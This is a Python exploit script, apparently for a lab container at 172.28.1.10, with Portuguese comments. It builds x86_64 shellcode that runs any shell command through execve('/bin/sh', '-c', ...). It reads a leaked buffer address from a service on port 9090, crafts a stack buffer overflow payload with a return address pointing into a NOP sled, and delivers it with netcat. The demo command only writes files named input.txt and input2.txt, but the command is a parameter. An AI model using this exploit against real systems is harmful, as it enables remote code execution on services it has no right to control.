#!/usr/bin/env python3
import os
import subprocess
from random import randint
import socket
import ipaddress
import re


def create_hex_command(command = b"echo 'true' > input.txt"):
    comando_alinhado = command + b"\x00"
    while len(comando_alinhado) % 8 != 0:
        comando_alinhado += b"\x00"
    # Constrói o shellcode dinamicamente invertendo o comando para o PUSH (Stack cresce para baixo)
    shellcode_dinamico = b""

    # 1. Empilha o comando em blocos de 8 bytes (x86_64)
    for i in range(len(comando_alinhado) - 8, -1, -8):
        bloco = comando_alinhado[i:i+8]
        shellcode_dinamico += b"\x48\xb8" + bloco  # mov rax, bloco_de_8_bytes
        shellcode_dinamico += b"\x50"              # push rax

    shellcode_dinamico += b"\x48\x89\xe2"          # mov rdx, rsp (rdx aponta para o comando)

    # 2. Empilha a flag "-c"
    shellcode_dinamico += (
        b"\x48\xb8\x2d\x63\x00\x00\x00\x00\x00\x00"  # mov rax, 0x632d ("-c\x00...")
        b"\x50"                                      # push rax
        b"\x48\x89\xe6"                              # mov rsi, rsp (rsi aponta para "-c")
    )

    # 3. Empilha o executável "/bin/sh"
    shellcode_dinamico += (
        b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rax, 0x0068732f6e69622f ("/bin/sh\x00")
        b"\x50"                                      # push rax
        b"\x48\x89\xe7"                              # mov rdi, rsp (rdi aponta para "/bin/sh")
    )

    # 4. Constrói o array argv na pilha [ /bin/sh, -c, comando, NULL ]
    shellcode_dinamico += (
        b"\x48\x31\xc0"  # xor rax, rax
        b"\x50"          # push rax (NULL terminator do array)
        b"\x52"          # push rdx (ponteiro para o comando)
        b"\x56"          # push rsi (ponteiro para "-c")
        b"\x57"          # push rdi (ponteiro para "/bin/sh")
        b"\x48\x89\xe6"  # mov rsi, rsp (rsi agora é o argv[])
        b"\x48\x31\xd2"  # xor rdx, rdx (envp = NULL)
        b"\xb0\x3b"      # mov al, 59 (syscall execve)
        b"\x0f\x05"      # syscall
    )
    print(f"Shellcode pronto ({len(shellcode_dinamico)} bytes):")
    print(shellcode_dinamico)
    return shellcode_dinamico


def getNextTarget():
    return "172.28.1.10"


def getFile(bufaddr, shellcode):
    """
    Layout do payload (500 bytes, = tamanho de `input` em main):

      [0:72)     preenchimento (NOP) -- nunca é executado, só precisa nao ter \x00
      [72:80)    endereco de retorno -- aponta para dentro de `input` (main),
                 onde o NOP sled + shellcode ficam intactos (o read() nao trunca em \0,
                 diferente do strcpy que soh alcanca ateh aqui)
      [80:100)   NOP sled
      [100:...)  shellcode (create_hex_command, sem alteracao)
    """
    OFFSET = 72                        # distancia confirmada via GDB: buffer -> retorno
    INPUT_OFFSET_FROM_BUFFER = 0x50    # distancia fixa entre buffer (bof) e input (main)
    SHELL_START = 100

    content = bytearray(0x90 for _ in range(500))
    content[SHELL_START:SHELL_START + len(shellcode)] = shellcode

    input_addr = bufaddr + INPUT_OFFSET_FROM_BUFFER
    ret = input_addr + 80              # aponta pro comeco do NOP sled, dentro de `input`

    content[OFFSET:OFFSET + 8] = ret.to_bytes(8, byteorder="little")

    return content


def writeFile(file, targetIP):
    with open("file", "wb") as f:
        f.write(file)

    print(f"Adding file to {targetIP} na porta 9090...")

    subprocess.run(
        f"cat file | nc -w3 {targetIP} 9090",
        shell=True,
        timeout=5
    )


def bufferAddress(targetIP):
    result = subprocess.run(
        f"echo | nc -w3 {targetIP} 9090",
        shell=True,
        timeout=5,
        capture_output=True,
        text=True
    )

    print(result.stdout)

    match = re.search(r"0x[0-9a-fA-F]+", result.stdout)
    if match:
        return int(match.group(), 16)

    return None


def main():
    print("Olá! ^_^")

    targetIP = getNextTarget()
    print(f"Host de destino: {targetIP}")

    bufaddr = bufferAddress(targetIP)
    if bufaddr is None:
        print("Não consegui ler o endereço do buffer. Abortando.")
        return
    print(f"Endereço do buffer: {hex(bufaddr)}")

    shellcode = create_hex_command(b"echo 'true' > input.txt && echo 'true' > input2.txt")
    payload = getFile(bufaddr, shellcode)

    writeFile(payload, targetIP)

    print("Payload enviado! Verifique se input.txt apareceu dentro do container.")


if __name__ == "__main__":
    while True:
        main()
        break
